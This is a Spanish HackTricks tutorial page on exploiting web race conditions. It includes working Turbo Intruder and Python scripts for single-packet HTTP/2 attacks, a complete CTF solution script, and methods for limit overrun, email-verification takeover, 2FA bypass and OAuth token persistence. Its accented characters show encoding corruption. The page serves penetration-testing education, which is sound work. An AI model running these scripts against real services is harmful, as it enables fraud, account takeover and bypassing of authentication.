# Condici贸n de Carrera

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) para construir y **automatizar flujos de trabajo** f谩cilmente impulsados por las **herramientas comunitarias m谩s avanzadas** del mundo.\
Obt茅n acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

{% hint style="warning" %}
Para obtener una comprensi贸n profunda de esta t茅cnica, consulta el informe original en [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Mejorando los Ataques de Condici贸n de Carrera

El principal obst谩culo para aprovechar las condiciones de carrera es asegurarse de que m煤ltiples solicitudes se manejen al mismo tiempo, con **muy poca diferencia en sus tiempos de procesamientoidealmente, menos de 1ms**.

Aqu铆 puedes encontrar algunas t茅cnicas para Sincronizar Solicitudes:

#### Ataque de Paquete nico HTTP/2 vs. Sincronizaci贸n de ltimo Byte HTTP/1.1

* **HTTP/2**: Soporta el env铆o de dos solicitudes a trav茅s de una 煤nica conexi贸n TCP, reduciendo el impacto del jitter de red. Sin embargo, debido a las variaciones del lado del servidor, dos solicitudes pueden no ser suficientes para un exploit consistente de condici贸n de carrera.
* **Sincronizaci贸n de 'ltimo Byte' HTTP/1.1**: Permite el pre-env铆o de la mayor铆a de las partes de 20-30 solicitudes, reteniendo un peque帽o fragmento, que luego se env铆a junto, logrando una llegada simult谩nea al servidor.

**La preparaci贸n para la Sincronizaci贸n de ltimo Byte** implica:

1. Enviar encabezados y datos del cuerpo menos el byte final sin finalizar el flujo.
2. Pausar durante 100ms despu茅s del env铆o inicial.
3. Desactivar TCP\_NODELAY para utilizar el algoritmo de Nagle para agrupar los cuadros finales.
4. Hacer ping para calentar la conexi贸n.

El env铆o posterior de los cuadros retenidos deber铆a resultar en su llegada en un solo paquete, verificable a trav茅s de Wireshark. Este m茅todo no se aplica a archivos est谩ticos, que no suelen estar involucrados en ataques de RC.

### Adapt谩ndose a la Arquitectura del Servidor

Entender la arquitectura del objetivo es crucial. Los servidores front-end pueden enrutar las solicitudes de manera diferente, afectando el tiempo. El calentamiento proactivo de la conexi贸n del lado del servidor, a trav茅s de solicitudes insignificantes, podr铆a normalizar el tiempo de las solicitudes.

#### Manejo de Bloqueo Basado en Sesiones

Frameworks como el manejador de sesiones de PHP serializan las solicitudes por sesi贸n, potencialmente oscureciendo vulnerabilidades. Utilizar diferentes tokens de sesi贸n para cada solicitud puede eludir este problema.

#### Superando L铆mites de Tasa o Recursos

Si el calentamiento de la conexi贸n no es efectivo, provocar intencionalmente retrasos en los l铆mites de tasa o recursos de los servidores web a trav茅s de una inundaci贸n de solicitudes ficticias podr铆a facilitar el ataque de paquete 煤nico al inducir un retraso del lado del servidor propicio para las condiciones de carrera.

## Ejemplos de Ataque

* **Tubo Intruder - ataque de paquete 煤nico HTTP2 (1 endpoint)**: Puedes enviar la solicitud a **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), puedes cambiar en la solicitud el valor que deseas forzar para **`%s`** como en `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` y luego seleccionar el **`examples/race-single-packer-attack.py`** del men煤 desplegable:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Si vas a **enviar diferentes valores**, podr铆as modificar el c贸digo con este que utiliza una lista de palabras del portapapeles:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Si la web no soporta HTTP2 (solo HTTP1.1) usa `Engine.THREADED` o `Engine.BURP` en lugar de `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - ataque de un solo paquete HTTP2 (Varios puntos finales)**: En caso de que necesites enviar una solicitud a 1 punto final y luego m煤ltiples a otros puntos finales para activar el RCE, puedes cambiar el script `race-single-packet-attack.py` por algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Tambi茅n est谩 disponible en **Repeater** a trav茅s de la nueva opci贸n '**Enviar grupo en paralelo**' en Burp Suite.
* Para **limit-overrun** podr铆as simplemente agregar la **misma solicitud 50 veces** en el grupo.
* Para **connection warming**, podr铆as **agregar** al **principio** del **grupo** algunas **solicitudes** a alguna parte no est谩tica del servidor web.
* Para **delaying** el proceso **entre** el procesamiento **de una solicitud y otra** en 2 pasos de subestado, podr铆as **agregar solicitudes extra entre** ambas solicitudes.
* Para un **multi-endpoint** RC podr铆as comenzar enviando la **solicitud** que **va al estado oculto** y luego **50 solicitudes** justo despu茅s que **explotan el estado oculto**.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **Script de python automatizado**: El objetivo de este script es cambiar el correo electr贸nico de un usuario mientras se verifica continuamente hasta que el token de verificaci贸n del nuevo correo llegue al 煤ltimo correo (esto se debe a que en el c贸digo se estaba viendo un RC donde era posible modificar un correo pero tener la verificaci贸n enviada al antiguo porque la variable que indicaba el correo ya estaba poblada con el primero).\
Cuando se encuentra la palabra "objetivo" en los correos electr贸nicos recibidos, sabemos que hemos recibido el token de verificaci贸n del correo cambiado y terminamos el ataque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Mejora del Ataque de Paquete nico

En la investigaci贸n original se explica que este ataque tiene un l铆mite de 1,500 bytes. Sin embargo, en [**esta publicaci贸n**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), se explic贸 c贸mo es posible extender la limitaci贸n de 1,500 bytes del ataque de paquete 煤nico a la **limitaci贸n de ventana de 65,535 B de TCP utilizando la fragmentaci贸n de capa IP** (dividiendo un solo paquete en m煤ltiples paquetes IP) y envi谩ndolos en un orden diferente, lo que permiti贸 evitar la reensambladura del paquete hasta que todos los fragmentos llegaran al servidor. Esta t茅cnica permiti贸 al investigador enviar 10,000 solicitudes en aproximadamente 166 ms.&#x20;

Tenga en cuenta que, aunque esta mejora hace que el ataque sea m谩s confiable en RC que requiere que cientos/miles de paquetes lleguen al mismo tiempo, tambi茅n puede tener algunas limitaciones de software. Algunos servidores HTTP populares como Apache, Nginx y Go tienen una configuraci贸n estricta de `SETTINGS_MAX_CONCURRENT_STREAMS` de 100, 128 y 250. Sin embargo, otros como NodeJS y nghttp2 lo tienen ilimitado.\
Esto significa b谩sicamente que Apache solo considerar谩 100 conexiones HTTP de una sola conexi贸n TCP (limitando este ataque RC).

Puede encontrar algunos ejemplos utilizando esta t茅cnica en el repositorio [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## BF Crudo

Antes de la investigaci贸n anterior, estos eran algunos payloads utilizados que solo intentaban enviar los paquetes lo m谩s r谩pido posible para causar un RC.

* **Repetidor:** Consulte los ejemplos de la secci贸n anterior.
* **Intruso**: Env铆e la **solicitud** a **Intruso**, establezca el **n煤mero de hilos** en **30** dentro del **men煤 de Opciones** y seleccione como payload **Payloads Nulos** y genere **30.**
* **Turbo Intruso**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodolog铆a RC**

### Limit-overrun / TOCTOU

Este es el tipo m谩s b谩sico de condici贸n de carrera donde **vulnerabilidades** que **aparecen** en lugares que **limitan el n煤mero de veces que puedes realizar una acci贸n**. Como usar el mismo c贸digo de descuento en una tienda web varias veces. Un ejemplo muy f谩cil se puede encontrar en [**este informe**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) o en [**este error**](https://hackerone.com/reports/759247)**.**

Hay muchas variaciones de este tipo de ataque, incluyendo:

* Redimir una tarjeta de regalo varias veces
* Calificar un producto varias veces
* Retirar o transferir efectivo en exceso de tu saldo de cuenta
* Reutilizar una 煤nica soluci贸n CAPTCHA
* Eludir un l铆mite de tasa anti-fuerza bruta

### **Subestados ocultos**

Explotar condiciones de carrera complejas a menudo implica aprovechar breves oportunidades para interactuar con subestados de m谩quina ocultos o **no intencionados**. Aqu铆 te mostramos c贸mo abordar esto:

1. **Identificar Subestados Ocultos Potenciales**
* Comienza por identificar puntos finales que modifican o interact煤an con datos cr铆ticos, como perfiles de usuario o procesos de restablecimiento de contrase帽a. Enf贸cate en:
* **Almacenamiento**: Prefiere puntos finales que manipulan datos persistentes del lado del servidor sobre aquellos que manejan datos del lado del cliente.
* **Acci贸n**: Busca operaciones que alteren datos existentes, que son m谩s propensas a crear condiciones explotables en comparaci贸n con aquellas que a帽aden nuevos datos.
* **Claves**: Los ataques exitosos generalmente involucran operaciones basadas en el mismo identificador, por ejemplo, nombre de usuario o token de restablecimiento.
2. **Realizar Sondeos Iniciales**
* Prueba los puntos finales identificados con ataques de condici贸n de carrera, observando cualquier desviaci贸n de los resultados esperados. Respuestas inesperadas o cambios en el comportamiento de la aplicaci贸n pueden se帽alar una vulnerabilidad.
3. **Demostrar la Vulnerabilidad**
* Reduce el ataque al n煤mero m铆nimo de solicitudes necesarias para explotar la vulnerabilidad, a menudo solo dos. Este paso puede requerir m煤ltiples intentos o automatizaci贸n debido al tiempo preciso involucrado.

### Ataques Sensibles al Tiempo

La precisi贸n en el tiempo de las solicitudes puede revelar vulnerabilidades, especialmente cuando se utilizan m茅todos predecibles como marcas de tiempo para tokens de seguridad. Por ejemplo, generar tokens de restablecimiento de contrase帽a basados en marcas de tiempo podr铆a permitir tokens id茅nticos para solicitudes simult谩neas.

**Para Explotar:**

* Usa un tiempo preciso, como un ataque de paquete 煤nico, para hacer solicitudes de restablecimiento de contrase帽a concurrentes. Tokens id茅nticos indican una vulnerabilidad.

**Ejemplo:**

* Solicita dos tokens de restablecimiento de contrase帽a al mismo tiempo y comp谩ralos. Tokens coincidentes sugieren un defecto en la generaci贸n de tokens.

**Revisa esto** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **para probar esto.**

## Estudios de caso de subestados ocultos

### Pagar y a帽adir un art铆culo

Revisa este [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver c贸mo **pagar** en una tienda y **agregar un extra** que **no necesitar谩s pagar**.

### Confirmar otros correos electr贸nicos

La idea es **verificar una direcci贸n de correo electr贸nico y cambiarla a una diferente al mismo tiempo** para averiguar si la plataforma verifica la nueva que se cambi贸.

### Cambiar correo electr贸nico a 2 direcciones de correo basadas en cookies

Seg煤n [**esta investigaci贸n**](https://portswigger.net/research/smashing-the-state-machine), Gitlab era vulnerable a una toma de control de esta manera porque podr铆a **enviar** el **token de verificaci贸n de correo de un correo al otro correo**.

**Revisa esto** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **para probar esto.**

### Estados ocultos de la base de datos / Bypass de confirmaci贸n

Si se utilizan **2 escrituras diferentes** para **agregar** **informaci贸n** dentro de una **base de datos**, hay una peque帽a porci贸n de tiempo donde **solo los primeros datos han sido escritos** dentro de la base de datos. Por ejemplo, al crear un usuario, el **nombre de usuario** y **contrase帽a** pueden ser **escritos** y **luego el token** para confirmar la cuenta reci茅n creada es escrito. Esto significa que durante un breve tiempo el **token para confirmar una cuenta es nulo**.

Por lo tanto, **registrar una cuenta y enviar varias solicitudes con un token vac铆o** (`token=` o `token[]=` o cualquier otra variaci贸n) para confirmar la cuenta de inmediato podr铆a permitir **confirmar una cuenta** donde no controlas el correo electr贸nico.

**Revisa esto** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **para probar esto.**

### Bypass 2FA

El siguiente pseudo-c贸digo es vulnerable a condici贸n de carrera porque en un tiempo muy peque帽o **2FA no se aplica** mientras se crea la sesi贸n:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### Persistencia eterna de OAuth2

Hay varios [**proveedores de OAUth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Estos servicios te permitir谩n crear una aplicaci贸n y autenticar a los usuarios que el proveedor ha registrado. Para hacerlo, el **cliente** necesitar谩 **permitir que tu aplicaci贸n** acceda a algunos de sus datos dentro del **proveedor de OAUth**.\
As铆 que, hasta aqu铆, solo un inicio de sesi贸n com煤n con google/linkedin/github... donde se te presenta una p谩gina que dice: "_La aplicaci贸n \<InsertCoolName> quiere acceder a tu informaci贸n, 驴quieres permitirlo?_"

#### Condici贸n de carrera en `authorization_code`

El **problema** aparece cuando **lo aceptas** y autom谩ticamente env铆a un **`authorization_code`** a la aplicaci贸n maliciosa. Luego, esta **aplicaci贸n abusa de una Condici贸n de Carrera en el proveedor de servicio OAUth para generar m谩s de un AT/RT** (_Token de Autenticaci贸n/Token de Refresco_) a partir del **`authorization_code`** de tu cuenta. B谩sicamente, abusar谩 del hecho de que has aceptado la aplicaci贸n para acceder a tus datos para **crear varias cuentas**. Luego, si **dejas de permitir que la aplicaci贸n acceda a tus datos, un par de AT/RT ser谩 eliminado, pero los otros seguir谩n siendo v谩lidos**.

#### Condici贸n de carrera en `Refresh Token`

Una vez que has **obtenido un RT v谩lido**, podr铆as intentar **abusar de 茅l para generar varios AT/RT** y **incluso si el usuario cancela los permisos** para que la aplicaci贸n maliciosa acceda a sus datos, **varios RT seguir谩n siendo v谩lidos.**

## **RC en WebSockets**

En [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) puedes encontrar un PoC en Java para enviar mensajes de websocket en **paralelo** para abusar de **Condiciones de Carrera tambi茅n en Web Sockets**.

## Referencias

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
* [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) para construir y **automatizar flujos de trabajo** f谩cilmente impulsados por las **herramientas comunitarias m谩s avanzadas** del mundo.\
Obt茅n acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
